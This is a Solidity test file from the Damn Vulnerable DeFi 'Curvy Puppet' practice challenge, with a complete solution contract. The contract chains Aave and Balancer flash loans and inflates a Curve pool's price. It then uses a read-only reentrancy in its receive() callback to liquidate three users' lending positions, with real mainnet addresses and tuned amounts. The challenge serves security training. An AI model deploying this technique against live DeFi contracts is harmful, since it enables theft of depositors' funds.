// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt), _curvePool: curvePool, _permit2: permit2, _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        IERC20 curveLpToken = IERC20(curvePool.lp_token());
        CurvyPuppetExploit exploit = new CurvyPuppetExploit({
            _curvePool: curvePool,
            _lending: lending,
            _curveLpToken: curveLpToken,
            _stETH: stETH,
            _weth: weth,
            _dvt: dvt,
            _treasury: treasury,
            _alice: alice,
            _bob: bob,
            _charlie: charlie
        });

        curveLpToken.transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);

        exploit.executeExploit();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

contract CurvyPuppetExploit {
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IAaveFlashloan constant AAVE_V2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IStableSwap public immutable curvePool;
    CurvyPuppetLending public immutable lending;
    IERC20 public immutable curveLpToken;
    IERC20 public immutable stETH;
    WETH public immutable weth;
    DamnValuableToken public immutable dvt;
    address public immutable treasury;
    address public immutable alice;
    address public immutable bob;
    address public immutable charlie;

    bool private liquidated;

    constructor(
        IStableSwap _curvePool,
        CurvyPuppetLending _lending,
        IERC20 _curveLpToken,
        IERC20 _stETH,
        WETH _weth,
        DamnValuableToken _dvt,
        address _treasury,
        address _alice,
        address _bob,
        address _charlie
    ) {
        curvePool = _curvePool;
        lending = _lending;
        curveLpToken = _curveLpToken;
        stETH = _stETH;
        weth = _weth;
        dvt = _dvt;
        treasury = _treasury;
        alice = _alice;
        bob = _bob;
        charlie = _charlie;
    }

    ///@dev Aave Flashloan
    function executeExploit() external {
        curveLpToken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(curveLpToken),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp + 1 days)
        });

        stETH.approve(address(AAVE_V2), type(uint256).max);
        weth.approve(address(AAVE_V2), type(uint256).max);

        address[] memory assets = new address[](2);
        assets[0] = address(stETH); //LPToken (borrowAsset)
        assets[1] = address(weth); // Collateral 

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 172_000 ether;
        amounts[1] = 20_500 ether;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        dvt.transfer(treasury, dvt.balanceOf(address(this)));
        weth.transfer(treasury, weth.balanceOf(address(this)));
        curveLpToken.transfer(treasury, curveLpToken.balanceOf(address(this)));
        stETH.transfer(treasury, stETH.balanceOf(address(this)));
    }

    ///@dev Aave Callback
    function executeOperation(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        address,
        bytes memory
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "not aave");

        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37_991 ether;

        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes(""));
        return true;
    }

    ///@dev balancer callback
    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(BALANCER_VAULT), "not balancer");

        weth.withdraw(58_685 ether);

        stETH.approve(address(curvePool), type(uint256).max);
        uint256[2] memory addAmounts;
        addAmounts[0] = 58_685 ether;
        addAmounts[1] = stETH.balanceOf(address(this));
        curvePool.add_liquidity{value: 58_685 ether}(addAmounts, 0);

        uint256[2] memory mins = [uint256(0), uint256(0)];
        uint256 lpBalance = curveLpToken.balanceOf(address(this));
        curvePool.remove_liquidity(lpBalance - 3 ether - 1, mins);

        weth.deposit{value: 37_991 ether}();
        weth.transfer(address(BALANCER_VAULT), 37_991 ether);

        uint256 ethToStEth = 12_963.923469069977697655 ether;
        curvePool.exchange{value: ethToStEth}(0, 1, ethToStEth, 1);
        weth.deposit{value: 20_518 ether}();
    }

    receive() external payable {
        if (msg.sender == address(curvePool) && !liquidated) {
            liquidated = true;
            lending.liquidate(alice);
            lending.liquidate(bob);
            lending.liquidate(charlie);
        }
    }
}
